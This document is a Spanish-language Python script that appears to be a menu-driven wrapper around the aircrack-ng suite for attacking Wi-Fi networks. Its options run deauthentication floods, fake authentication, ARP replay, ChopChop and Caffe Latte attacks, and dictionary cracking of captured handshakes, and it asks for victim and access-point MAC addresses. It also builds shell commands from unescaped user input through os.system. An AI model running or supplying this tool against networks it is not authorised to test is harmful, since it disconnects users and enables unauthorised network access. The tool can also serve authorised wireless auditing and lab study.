#!/usr/bin/python3

import os
import sys
from colorama import Fore, Style
from termcolor import colored

nombre_tarjeta = ""

def run(command):

    os.system("gnome-terminal -- sh -c \""+command+"; bash\"")

## BANNER ##
def print_banner(title=""):
    print(colored ("""
    ____                 _____ __ __
   / __ )____ _________  / ___// // /
  / __  / __ `/ ___/ _ \/ __ \/ // /_
 / /_/ / /_/ (__  )  __/ /_/ /__  __/
/_____/\__,_/____/\___/\____/  /_/   
                                     
""" ,'red'))


def menu_opciones():

    print(Fore.GREEN)
    print("=====================================================")
    print("Selecciona una de las siguientes opciones: \n\n")
    print("1. Mostrar informacion tarjeta")
    print("2. Escanear red (airodump-ng)")
    print("3. Escanear redes con parametros")
    print("4. Fake Auth")
    print("5. Hacer deauth")
    print("6. Cracking (aircrack-ng)")
    print("7. Caffe Latte Attack")
    print("8. CHOPCHOP Attack")
    print("9. ARP Replay Attack")
    print("10. Salir de la herramienta")
    print("=====================================================")
    print(Style.RESET_ALL)


def escanear_redes():

    run("sudo airodump-ng "+nombre_tarjeta)

def escanear_redes_avanzado():

    BSSID = ""
    ESSID = ""
    canal = ""
    fichero = input("Introduce el nombre del fichero para guardar: ")

    opcionBSSID = input("Quieres indicar el BSSID: (Y/N) ")
    if (opcionBSSID.capitalize() == 'Y'):
        BSSID = " --bssid " + input("Introduce el nombre BSSID: ")

    opcionESSID = input("Quieres indicar el ESSID: (Y/N) ")
    if (opcionESSID.capitalize() == 'Y'):
        ESSID = " --essid " + input("Introduce el nombre ESSID: ")

    opcionCanal = input("Quieres indicar el canal: (Y/N) ")
    if (opcionCanal.capitalize() == 'Y'):
        canal = " --channel " + input("Introduce el numero del canal: ")

    comando = "sudo airodump-ng "+nombre_tarjeta+BSSID+ESSID+canal+" --write "+fichero
    run(comando)

def deauth():

    ESSID = " -e " + input("Introduce el nombre ESSID: ")
    d = " --deauth 0"
    MAC_AP = " -a " + input("Introduce la MAC del AP: ")
    comando = "sudo aireplay-ng "+ d + ESSID + MAC_AP + " " + nombre_tarjeta
    run(comando)

def replay_attack():

    MAC_AP = " -b " + input("Introduce la MAC del AP: ")
    MAC_V = ""
    if input("Quieres indicar la MAC de la victima?: (Y/N) ")=="Y":
        MAC_V=" -h " + input("Introduce la MAC de la victima: ")
    comando = "sudo aireplay-ng --arpreplay -e WLAN " + MAC_AP + MAC_V + " " + nombre_tarjeta
    run(comando)

def fake_auth():

    mac_victima = " -h "  + input("Introduce la MAC victima: ")
    mac_ap = " -a " + input("Introduce la MAC del AP: ")
    comando = "sudo aireplay-ng --fakeauth"+mac_ap+mac_victima+" "+nombre_tarjeta
    run(comando)

def cracking():

    comando = "aircrack-ng"
    nombre = " " + input("Introduce el nombre del archivo sin extension: ") + "-01.cap"
    diccionario = " -w "+input("Introduce la ruta del diccionario: ")
    comando = comando + nombre + diccionario
    run(comando)

def caffe_late():

    comando = "sudo airbase-ng -W 1"
    canal = " --channel " + input("Introduce el numero del canal: ")
    ESSID = " -e " + input("Introduce el nombre ESSID ")

    comando = comando + canal + ESSID + " " + nombre_tarjeta
    run(comando)


def chopchop():

    comando = "sudo aireplay-ng --chopchop -e WLAN " + nombre_tarjeta
    run(comando)

def opciones(operacion):

    if(operacion == 1):
        os.system("iwconfig")
    elif(operacion == 2):
        escanear_redes()
    elif(operacion == 3):
        escanear_redes_avanzado()
    elif(operacion == 4):
        fake_auth()
    elif(operacion == 5):
        deauth()
    elif(operacion == 6):
        cracking()
    elif(operacion == 7):
        caffe_late()
    elif(operacion == 8):
        chopchop()
    elif(operacion == 9):
        replay_attack()


if __name__ == '__main__':
    print_banner()
    nombre_tarjeta = input("Para comenzar introduce el nombre de tu tarjeta de red: ")
    opcion = 0
    while(opcion!=10):
        menu_opciones()
        opcion = int(input("\n> "))
        opciones(opcion)
## Salida del programa
    print("Chao pescao!! 🐟")
    sys.exit(0)

